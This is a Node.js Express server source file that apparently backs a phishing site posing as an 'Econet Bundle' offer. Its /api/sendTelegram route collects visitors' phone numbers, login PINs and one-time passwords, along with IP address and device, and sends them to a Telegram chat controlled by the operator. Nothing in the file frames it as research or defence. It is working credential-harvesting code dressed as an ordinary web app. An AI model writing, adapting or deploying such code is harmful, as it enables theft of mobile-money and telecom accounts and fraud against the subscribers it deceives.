'use strict';

const express    = require('express');
const path       = require('path');
const https      = require('https');
const rateLimit  = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

/* ── MIDDLEWARE ────────────────────────────── */
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: false }));

/* ── SECURITY HEADERS ──────────────────────── */
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',  'nosniff');
  res.setHeader('X-Frame-Options',         'DENY');
  res.setHeader('X-XSS-Protection',        '1; mode=block');
  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy',      'geolocation=(), microphone=()');
  next();
});

/* ── RATE LIMIT on API ─────────────────────── */
const apiLimiter = rateLimit({
  windowMs : 15 * 60 * 1000, // 15 minutes
  max      : 30,              // max 30 submissions per IP per window
  message  : { error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders  : false,
});
app.use('/api/', apiLimiter);

/* ── STATIC FILES ──────────────────────────── */
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index     : 'index.html',
}));

/* ── TELEGRAM HELPER ───────────────────────── */
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing BOT_TOKEN or CHAT_ID env vars');
      return resolve({ ok: false, reason: 'env_missing' });
    }

    const body = JSON.stringify({
      chat_id    : CHAT_ID,
      text       : text,
      parse_mode : 'HTML',
    });

    const options = {
      hostname: 'api.telegram.org',
      path    : `/bot${BOT_TOKEN}/sendMessage`,
      method  : 'POST',
      headers : {
        'Content-Type'  : 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch (e) { resolve({ ok: false }); }
      });
    });

    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/* ── API ROUTE ─────────────────────────────── */
app.post('/api/sendTelegram', async (req, res) => {
  try {
    const {
      submittedAt = '',
      loginPhone  = '',
      loginPin    = '',
      otp         = '',
      event       = '',
      plan        = '',
      device      = '',
    } = req.body || {};

    // Basic server-side validation
    if (!loginPhone && !otp) {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    const emoji = {
      receive_offer_clicked : '📲',
      offer_received        : '✅',
      resend_otp            : '🔁',
    }[event] || '📋';

    const message = [
      `${emoji} <b>Econet Bundle — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedAt}`,
      `📱 <b>Phone:</b> <code>${loginPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp || '—'}</code>`,
      ``,
      `📦 <b>Plan:</b> ${plan}`,
      `📟 <b>Device:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip || req.headers['x-forwarded-for'] || '—'}`,
    ].join('\n');

    const result = await sendTelegramMessage(message);

    return res.json({ ok: true, telegram: result.ok });

  } catch (err) {
    console.error('[/api/sendTelegram] Error:', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── HEALTH CHECK ──────────────────────────── */
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

/* ── CATCH-ALL → index.html ────────────────── */
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

/* ── START ─────────────────────────────────── */
app.listen(PORT, () => {
  console.log(`✅  Server running on port ${PORT}`);
  console.log(`    Telegram bot: ${process.env.TELEGRAM_TOKEN    ? 'configured ✓' : 'MISSING ⚠'}`);
  console.log(`    Telegram chat: ${process.env.TELEGRAM_CHAT_ID ? 'configured ✓' : 'MISSING ⚠'}`);
});
